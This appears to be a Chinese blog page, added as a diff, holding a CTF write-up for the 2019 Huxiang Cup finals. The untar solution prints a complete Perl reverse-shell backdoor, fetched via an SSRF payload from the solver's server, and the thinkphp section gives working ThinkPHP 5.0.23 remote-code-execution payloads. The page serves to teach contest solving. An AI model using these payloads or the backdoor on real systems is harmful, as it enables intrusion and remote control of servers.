@@ -1,0 +1,627 @@
+
+<!DOCTYPE html>
+<html lang class="loading">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>湖湘杯复赛 Write Up - Knlvre</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate">
+    <meta name="keywords" content="TriDiamond Obsidian,"> 
+    <meta name="description" content="湖湘杯复赛时间：2019年11月9号
+记录 2 道 Web 题目，2 道 Misc 题目
+untar参考文章：记一次对ssrf的理解
+源码如下
+ &amp;lt;?php
+    $sandbox = &amp;q,"> 
+    <meta name="author" content="Knlvre"> 
+    <link rel="alternative" href="atom.xml" title="Knlvre" type="application/atom+xml"> 
+    <link rel="icon" href="/knlvre.github.io/img/favicon.png"> 
+    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
+    <link rel="stylesheet" href="/knlvre.github.io/css/obsidian.css">
+    <link rel="stylesheet" href="/knlvre.github.io/css/ball-atom.min.css">
+</head>
+</html>
+
+<body class="loading">
+    <div class="loader">
+        <div class="la-ball-atom la-2x">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+    <span id="config-title" style="display:none">Knlvre</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div class="scrollbar gradient-bg-rev"></div>
+<div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <div class="navigation animated fadeIn fast delay-1s">
+        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="https://knlvre.github.io">
+        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
+        <h3 class="subtitle">湖湘杯复赛 Write Up</h3>
+        <div class="social">
+            <!--        <div class="like-icon">-->
+            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+            <!--        </div>-->
+            <div>
+                <div class="share">
+                    
+                        <a href="javascript:;" class="iconfont icon-share1"></a>
+                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <div class="section">
+        <div class=article-header-wrapper>
+    <div class="article-header">
+        <div class="article-cover animated fadeIn" style="
+            animation-delay: 600ms;
+            animation-duration: 1.2s;
+            background-image: 
+                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+                url(/img/cover.jpg);">
+        </div>
+        <div class="else">
+            <p class="animated fadeInDown">
+                
+                <a href="javascript:;"><b>「 </b>Article<b> 」</b></a>
+                
+                November 09, 2019
+            </p>
+            <h3 class="post-title animated fadeInDown"><a href="/knlvre.github.io/2019/11/09/湖湘杯复赛 Write Up/" title="湖湘杯复赛 Write Up">湖湘杯复赛 Write Up</a>
+            </h3>
+            
+            <p class="post-count animated fadeInDown">
+                
+                <span>
+                    <b class="iconfont icon-text2"></b> <i>Words count</i>
+                    9.5k
+                </span>
+                
+                
+                <span>
+                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
+                    9 mins.
+                </span>
+                
+                
+                
+                <span id="busuanzi_container_page_pv">
+                    <b class="iconfont icon-read"></b> <i>Read count</i>
+                    <span id="busuanzi_value_page_pv">0</span>
+                </span>
+                
+            </p>
+            
+            
+            <ul class="animated fadeInDown post-tags-list"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/knlvre.github.io/tags/CTF比赛/">CTF比赛</a></li></ul>
+            
+        </div>
+    </div>
+</div>
+
+<div class="screen-gradient-after">
+    <div class="screen-gradient-content">
+        <div class="screen-gradient-content-inside">
+            <div class="bold-underline-links screen-gradient-sponsor">
+                <p>
+                    <span class="animated fadeIn delay-1s"></span>
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="article">
+    <div class='main'>
+        <div class="content markdown animated fadeIn">
+            <h1 id="湖湘杯复赛"><a href="#湖湘杯复赛" class="headerlink" title="湖湘杯复赛"></a>湖湘杯复赛</h1><p>时间：2019年11月9号</p>
+<p>记录 2 道 Web 题目，2 道 Misc 题目</p>
+<h2 id="untar"><a href="#untar" class="headerlink" title="untar"></a>untar</h2><p>参考文章：<a href="[&lt;https://1isten.xyz/2018/10/03/记一次对ssrf的理解/">记一次对ssrf的理解</a></p>
+<p>源码如下</p>
+<pre><code class="php"> &lt;?php
+    $sandbox = &quot;sandbox/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);
+    echo $sandbox.&quot;&lt;/br&gt;&quot;;
+    @mkdir($sandbox);
+    @chdir($sandbox);
+    if (isset($_GET[&quot;url&quot;]) &amp;&amp; !preg_match(&#39;/^(http|https):\/\/.*/&#39;, $_GET[&quot;url&quot;]))
+        die();
+    $url  = str_replace(&quot;|&quot;, &quot;&quot;, $_GET[&quot;url&quot;]);
+    $data = shell_exec(&quot;GET &quot; . escapeshellarg($url));
+    $info = pathinfo($_GET[&quot;filename&quot;]);
+    $dir  = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));
+    @mkdir($dir);
+    @chdir($dir);
+    @file_put_contents(basename($info[&quot;basename&quot;]), $data);
+    shell_exec(&quot;UNTAR &quot;.escapeshellarg(basename($info[&quot;basename&quot;])));
+    highlight_file(__FILE__); 
+?&gt;
+</code></pre>
+<p>这是一道<strong>SSRF</strong>题目</p>
+<p>传入的参数一共只有 2 个：<strong>url</strong>和<strong>filename</strong>：① 参数 url 只能使用<strong>http://</strong>或者<strong>https://</strong>协议；② 参数 filename 经过<strong>pathinfo()</strong>函数处理；二者都用<strong>escapeshellarg()</strong>函数处理</p>
+<p><strong>escapeshellarg()</strong></p>
+<p>作用：给参数加上单引号</p>
+<pre><code class="bash">php &gt; var_dump(escapeshellarg(&quot;file&quot;));
+string(6) &quot;&#39;file&#39;&quot;
+</code></pre>
+<p><strong>pathinfo()</strong></p>
+<p>作用：以数组的形式返回文件路径的信息</p>
+<pre><code class="bash">php &gt; var_dump(pathinfo(&quot;file&quot;));
+array(3) {
+  [&quot;dirname&quot;]=&gt;
+  string(1) &quot;.&quot;
+  [&quot;basename&quot;]=&gt;
+  string(4) &quot;file&quot;
+  [&quot;filename&quot;]=&gt;
+  string(4) &quot;file&quot;
+}
+php &gt; var_dump(pathinfo(&quot;path/file.php&quot;));
+array(4) {
+  [&quot;dirname&quot;]=&gt;
+  string(4) &quot;path&quot;
+  [&quot;basename&quot;]=&gt;
+  string(8) &quot;file.php&quot;
+  [&quot;extension&quot;]=&gt;
+  string(3) &quot;php&quot;
+  [&quot;filename&quot;]=&gt;
+  string(4) &quot;file&quot;
+}
+</code></pre>
+<p><strong>解题思路</strong></p>
+<p>弄清楚之后，我们直接看着 payload 梳理解题思路，payload 如下</p>
+<pre><code class="bash">第一次执行：
+?filename=URI/listen.pm&amp;url=http://Your_VPS_IP/backdoor.txt
+
+第二次执行：
+?filename=xxx&amp;url=http://Your_VPS_IP
+Ps:执行前需要在 vps 上写个重定向到 listen://listen.xyz，并且监听端口
+</code></pre>
+<p>① 首先分析第一个 payload</p>
+<pre><code class="bash">?filename=URI/listen.pm&amp;url=http://Your_VPS_IP/backdoor.txt
+</code></pre>
+<p>看一下 pathinfo() 对我们第一个 payload 中 filename 参数的解析</p>
+<pre><code class="bash">php &gt; var_dump(pathinfo(&quot;URI/listen.pm&quot;));
+array(4) {
+  [&quot;dirname&quot;]=&gt;
+  string(3) &quot;URI&quot;
+  [&quot;basename&quot;]=&gt;
+  string(9) &quot;listen.pm&quot;
+  [&quot;extension&quot;]=&gt;
+  string(2) &quot;pm&quot;
+  [&quot;filename&quot;]=&gt;
+  string(6) &quot;listen&quot;
+}
+</code></pre>
+<p>backdoor.txt 像参考文章说的一样，是一个<strong>perl后门</strong>，内容如下：</p>
+<p>:alarm_clock:后门内的 ip 要记得改成你的 VPS 的 ip</p>
+<pre><code class="perl">#!/usr/bin/perl -w
+# perl-reverse-shell - A Reverse Shell implementation in PERL
+use strict;
+use Socket;
+use FileHandle;
+use POSIX;
+my $VERSION = &quot;1.0&quot;;
+
+# Where to send the reverse shell. Change these.
+my $ip = &#39;127.0.0.1&#39;;
+my $port = 1234;
+
+# Options
+my $daemon = 1;
+my $auth   = 0; # 0 means authentication is disabled and any
+        # source IP can access the reverse shell
+my $authorised_client_pattern = qr(^127\.0\.0\.1$);
+
+# Declarations
+my $global_page = &quot;&quot;;
+my $fake_process_name = &quot;/usr/sbin/apache&quot;;
+
+# Change the process name to be less conspicious
+$0 = &quot;[httpd]&quot;;
+
+# Authenticate based on source IP address if required
+if (defined($ENV{&#39;REMOTE_ADDR&#39;})) {
+    cgiprint(&quot;Browser IP address appears to be: $ENV{&#39;REMOTE_ADDR&#39;}&quot;);
+
+    if ($auth) {
+        unless ($ENV{&#39;REMOTE_ADDR&#39;} =~ $authorised_client_pattern) {
+            cgiprint(&quot;ERROR: Your client isn&#39;t authorised to view this page&quot;);
+            cgiexit();
+        }
+    }
+} elsif ($auth) {
+    cgiprint(&quot;ERROR: Authentication is enabled, but I couldn&#39;t determine your IP address. Denying access&quot;);
+    cgiexit(0);
+}
+
+# Background and dissociate from parent process if required
+if ($daemon) {
+    my $pid = fork();
+    if ($pid) {
+        cgiexit(0); # parent exits
+    }
+
+    setsid();
+    chdir(&#39;/&#39;);
+    umask(0);
+}
+
+# Make TCP connection for reverse shell
+socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname(&#39;tcp&#39;));
+if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {
+    cgiprint(&quot;Sent reverse shell to $ip:$port&quot;);
+    cgiprintpage();
+} else {
+    cgiprint(&quot;Couldn&#39;t open reverse shell to $ip:$port: $!&quot;);
+    cgiexit();    
+}
+
+# Redirect STDIN, STDOUT and STDERR to the TCP connection
+open(STDIN, &quot;&gt;&amp;SOCK&quot;);
+open(STDOUT,&quot;&gt;&amp;SOCK&quot;);
+open(STDERR,&quot;&gt;&amp;SOCK&quot;);
+$ENV{&#39;HISTFILE&#39;} = &#39;/dev/null&#39;;
+system(&quot;w;uname -a;id;pwd&quot;);
+exec({&quot;/bin/sh&quot;} ($fake_process_name, &quot;-i&quot;));
+
+# Wrapper around print
+sub cgiprint {
+    my $line = shift;
+    $line .= &quot;&lt;p&gt;\n&quot;;
+    $global_page .= $line;
+}
+
+# Wrapper around exit
+sub cgiexit {
+    cgiprintpage();
+    exit 0; # 0 to ensure we don&#39;t give a 500 response.
+}
+
+# Form HTTP response using all the messages gathered by cgiprint so far
+sub cgiprintpage {
+    print &quot;Content-Length: &quot; . length($global_page) . &quot;\r Connection: close\r Content-Type: text\/html\r\n\r\n&quot; . $global_page;
+}
+</code></pre>
+<p>所以当我们执行第一个 payload 后，会在当前目录下再创建一个<strong>URI</strong>目录，并且进入这个目录，再创建 listen.pm ，内容为我们的 perl后门（backdoor.txt）</p>
+<p>② 接下来分析第二个 payload</p>
+<pre><code class="bash">?filename=xxx&amp;url=http://Your_VPS_IP
+Ps:执行前需要在 vps 上写个重定向到 listen://listen.xyz，并且监听端口
+</code></pre>
+<p>由于做了重定向，所以当访问我们的 VPS 时，就等同于访问<strong>listen://listen.xyz</strong>，但是 listen 是未定义的模块，所以会自动搜索并加载<strong>URI/listen.pm</strong>（pm 是 perl 脚本的后缀），也就是我们刚在上传的后门（这里因为源码中对参数 url 做了过滤，只允许 http:// 和 https:// 协议，所以不能像参考文章那样直接在 url 参数中写 listen:// ，需要做个重定向来解决）</p>
+<p>重定向做完 + 端口监听 + 执行 payload 之后，就会收到 shell</p>
+<p>然后执行根目录下的<strong>readflag</strong>就能拿到 flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9B/4-1.png" alt="4-1"></p>
+<h2 id="thinkphp"><a href="#thinkphp" class="headerlink" title="thinkphp?"></a>thinkphp?</h2><p>按照题目的提示，应该是<strong>thinkphp</strong>的洞。进来后要登录，先注册一个普通用户登录</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9B/1-1.png" alt="1-1"></p>
+<p>然后用这个普通用户登陆进去</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9B/1-2.png" alt="1-2"></p>
+<p>打算直接用一下之前刚碰到的<strong>thinkphp 5.0.23</strong>的<strong>RCE</strong>，看一下漏洞是否存在，结果直接看到版本号</p>
+<pre><code class="bash">http://183.129.189.62:19403/?s=captcha
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9B/1-3.png" alt="1-3"></p>
+<p>参考文章：<a href="https://xz.aliyun.com/t/6106#toc-0" target="_blank" rel="noopener">记一次有趣的tp5代码执行</a></p>
+<p>试一下<strong>scandir()</strong>和<strong>var_dump()</strong>，扫描当前目录，直接出结果</p>
+<pre><code class="bash">URL：http://183.129.189.62:19403/index.php?s=captcha
+
+POST：_method=__construct&amp;method=get&amp;filter[]=scandir&amp;filter[]=var_dump&amp;server[]=1&amp;get[]=.
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9B/1-4.png" alt="1-4"></p>
+<p>然后在<strong>根目录</strong>下找到<strong>flag</strong>字样</p>
+<pre><code class="bash">URL：http://183.129.189.62:19403/index.php?s=captcha
+
+POST：_method=__construct&amp;method=get&amp;filter[]=scandir&amp;filter[]=var_dump&amp;server[]=1&amp;get[]=../../../
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9B/1-5.png" alt="1-5"></p>
+<p>直接读取内容，拿下 flag</p>
+<pre><code class="bash">URL：http://183.129.189.62:19403/index.php?s=captcha
+
+POST：_method=__construct&amp;method=get&amp;filter[]=readfile&amp;filter[]=var_dump&amp;server[]=1&amp;get[]=../../../flag
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9B/1-6.png" alt="1-6"></p>
+<h2 id="something-in-image"><a href="#something-in-image" class="headerlink" title="something in image"></a>something in image</h2><p>解压下来一个名为<strong>badimages</strong>的文件，直接拿到 fl</p>
+<pre><code class="bash">strings badimages | grep -i flag
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9B/2-1.png" alt="2-1"></p>
+<h2 id="EzMemory"><a href="#EzMemory" class="headerlink" title="EzMemory"></a>EzMemory</h2><p>文件有点大，但是跟上一题一样，还是直接拿下 flag</p>
+<pre><code class="bash">strings mem.raw | grep -i flag{
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/CTF/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9B/3-1.png" alt="3-1"></p>
+<p># </p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls"
+                data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+            <ul id="audio-list" style="display:none">
+                
+                
+                <li title='0' data-url='/knlvre.github.io/statics/forhim.mp3'></li>
+                
+                    
+            </ul>
+            
+            
+            
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='ec894e2b66f752e8b7fb'
+        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
+        data-r='blog-comments'
+        data-o='TriDiamond'
+        data-a='TriDiamond'
+        data-d=''
+    >Comments</div>
+
+
+            
+            
+        </div>
+        <div class="sidebar">
+            <div class="box animated fadeInRight">
+                <div class="subbox">
+                    <img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/ico/HaZong.jpg" height=300 width=300></img>
+                    <p>Knlvre</p>
+                    <span>Notes During Information Security Learning.</span>
+                    <dl>
+                        <dd><a href="https://github.com/knlvre" target="_blank"><span
+                                    class=" iconfont icon-github"></span></a></dd>
+                        <dd><a href="https://github.com/knlvre" target="_blank"><span
+                                    class=" iconfont icon-twitter"></span></a></dd>
+                        <dd><a href="https://github.com/knlvre" target="_blank"><span
+                                    class=" iconfont icon-stack-overflow"></span></a></dd>
+                    </dl>
+                </div>
+                <ul>
+                    <li><a href="/">65 <p>Articles</p></a></li>
+                    <li><a href="/categories">0 <p>Categories</p></a></li>
+                    <li><a href="/tags">9 <p>Tags</p></a></li>
+                </ul>
+            </div>
+            
+            
+            
+            <div class="box sticky animated fadeInRight faster">
+                <div id="toc" class="subbox">
+                    <h4>Contents</h4>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#湖湘杯复赛"><span class="toc-number">1.</span> <span class="toc-text">湖湘杯复赛</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#untar"><span class="toc-number">1.1.</span> <span class="toc-text">untar</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#thinkphp"><span class="toc-number">1.2.</span> <span class="toc-text">thinkphp?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#something-in-image"><span class="toc-number">1.3.</span> <span class="toc-text">something in image</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EzMemory"><span class="toc-number">1.4.</span> <span class="toc-text">EzMemory</span></a></li></ol></li></ol>
+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</div>
+
+    </div>
+</div>
+    <div id="back-to-top" class="animated fadeIn faster">
+        <div class="flow"></div>
+        <span class="percentage animated fadeIn faster">0%</span>
+        <span class="iconfont icon-top02 animated fadeIn faster"></span>
+    </div>
+</body>
+<footer>
+    <p class="copyright" id="copyright">
+        &copy; 2019
+        <span class="gradient-text">
+            Knlvre
+        </span>.
+        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+        Theme
+        <span class="gradient-text">
+            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
+        </span>
+        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
+    </p>
+</footer>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<script>
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+      preferredFont: "TeX",
+      availableFonts: ["STIX", "TeX"],
+      linebreaks: {
+        automatic: true
+      },
+      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"]
+      ],
+      processEscapes: true,
+      ignoreClass: "tex2jax_ignore|dno",
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+      noUndefined: {
+        attributes: {
+          mathcolor: "red",
+          mathbackground: "#FFEEEE",
+          mathsize: "90%"
+        }
+      },
+      Macros: {
+        href: "{}"
+      }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script>
+  function initialMathJax() {
+    MathJax.Hub.Queue(function () {
+      var all = MathJax.Hub.getAllJax(),
+        i;
+      // console.log(all);
+      for (i = 0; i < all.length; i += 1) {
+        console.log(all[i].SourceElement().parentNode)
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  }
+
+  function reprocessMathJax() {
+    if (typeof MathJax !== 'undefined') {
+      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
+    }
+  }
+</script>
+
+
+
+    <link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">
+    <script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="/knlvre.github.io/js/plugin.js"></script>
+<script src="/knlvre.github.io/js/obsidian.js"></script>
+<script src="/knlvre.github.io/js/jquery.truncate.js"></script>
+<script src="/knlvre.github.io/js/search.js"></script>
+<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>
+
+
+
+    <script src="/knlvre.github.io/js/busuanzi.min.js"></script>
+    <script>
+        $(document).ready(function () {
+            if ($('span[id^="busuanzi_"]').length) {
+                initialBusuanzi();
+            }
+        });
+    </script>
+
+
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-149874671-1');
+    </script>
+
+
+
+
+
+<script>
+    function initialTyped () {
+        var typedTextEl = $('.typed-text');
+        if (typedTextEl && typedTextEl.length > 0) {
+            var typed = new Typed('.typed-text', {
+                strings: ["Notes During Information Security Learning.", "信息安全学习过程中的笔记。"],
+                typeSpeed: 90,
+                loop: true,
+                loopCount: Infinity,
+                backSpeed: 20,
+            });
+        }
+    }
+
+    if ($('.article-header') && $('.article-header').length) {
+        $(document).ready(function () {
+            initialTyped();
+        });
+    }
+</script>
+
+
+
+
+</html>
